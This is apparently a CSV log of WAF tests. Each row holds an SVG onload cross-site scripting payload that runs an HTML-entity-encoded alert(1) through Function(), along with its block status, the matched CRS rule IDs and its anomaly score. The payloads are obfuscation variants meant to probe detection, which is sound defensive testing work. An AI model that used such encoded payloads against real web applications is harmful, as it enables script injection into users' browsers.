1981,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;1&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628929579.143916
1982,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;1&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628929696.752093
1986,"<svg><svg onload=""Function(&quot;&#97;lert&#40;&#49;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930035.313032
1987,<svg><svg onload='Function(&quot;&#97;lert&#40;&#49;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930199.884611
1988,<svg><svg onload=Function(&quot;&#97;lert&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930261.543531
1989,"<svg><svg onload=""Function(&quot;&#97;&#108;ert&#40;&#49;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930356.856930
1990,<svg><svg onload='Function(&quot;&#97;&#108;ert&#40;&#49;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930454.866003
1991,<svg><svg onload=Function(&quot;&#97;&#108;ert&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930588.386199
1992,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;rt&#40;&#49;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930678.041325
1993,<svg><svg onload='Function(&quot;&#97;&#108;&#101;rt&#40;&#49;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930767.025490
1994,<svg><svg onload=Function(&quot;&#97;&#108;&#101;rt&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930810.664720
1995,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;t&#40;&#49;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628930978.384034
1996,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;t&#40;&#49;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931028.694887
1997,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;t&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931117.708649
1998,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;(&#49;)&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931256.997733
1999,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;(&#49;)&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931322.258418
2000,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;(&#49;)&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931448.210412
2001,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;)&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762893155.730772
2002,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;)&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931678.664723
2003,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;)&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628931734.946279
2004,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;(1)&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762893180.951647
2005,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;(1)&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762893195.185823
2006,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;(1)&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628932064.556371
2010,"<svg><svg onload=""Function(&quot;&#0097;&#0108;&#0101;&#0114;&#0116;&#0040;&#0049;&#0041;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628932527.049765
2011,<svg><svg onload='Function(&quot;&#0097;&#0108;&#0101;&#0114;&#0116;&#0040;&#0049;&#0041;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628932625.110534
2012,<svg><svg onload=Function(&quot;&#0097;&#0108;&#0101;&#0114;&#0116;&#0040;&#0049;&#0041;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628932743.885961
2013,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#0049;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628932767.500765
2014,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#0049;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628932827.076935
2016,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#0041;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628933030.067693
2017,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#0041;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628933285.484326
2019,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#0040;&#49;&#41;&quot;)()""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628933413.107546
2020,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#0040;&#49;&#41;&quot;)()'></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628933588.134506
2021,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#0040;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628933681.590001
2028,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" class=x></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628934364.057294
2029,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' class=x></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628934418.349382
2034,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" xmlns=""http://www.w3.org/2000/svg""></svg></svg>",0,1,block,5,"941100,941120,941130,941160,949110","v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,6v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177628934937.279794
2035,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' xmlns=""http://www.w3.org/2000/svg""></svg></svg>",0,1,block,5,"941100,941120,941130,941160,949110","v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,6v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,135t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177628935045.605023
2036,"<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() xmlns=""http://www.w3.org/2000/svg""></svg></svg>",0,1,block,5,"941100,941120,941130,941160,949110","v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o39,6v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,133t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177628935177.072355
2040,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" width=100></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628935598.685839
2041,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' width=100></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628935657.173644
2042,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() width=100></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628935792.892352
2045,<svg><svg width=100 onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o19,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,27v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628936077.342561
2046,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" height=100></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628936125.078636
2047,<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' height=100></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628936296.460294
2048,<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() height=100></svg></svg>,0,1,block,4,"941100,941120,941160,949110","v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628936377.774821
2058,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" style=""color:red""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,48v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17762893737.882618
2059,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' style=""color:red""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,48v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628937484.850616
2064,"<svg><svg onload=""Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()"" viewBox=""0 0 100 100""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628937969.006014
2065,"<svg><svg onload='Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)()' viewBox=""0 0 100 100""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628938051.658099
2066,"<svg><svg onload=Function(&quot;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;)() viewBox=""0 0 100 100""></svg></svg>",0,1,block,4,"941100,941120,941160,949110","v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o9,8v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,17v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177628938141.798831
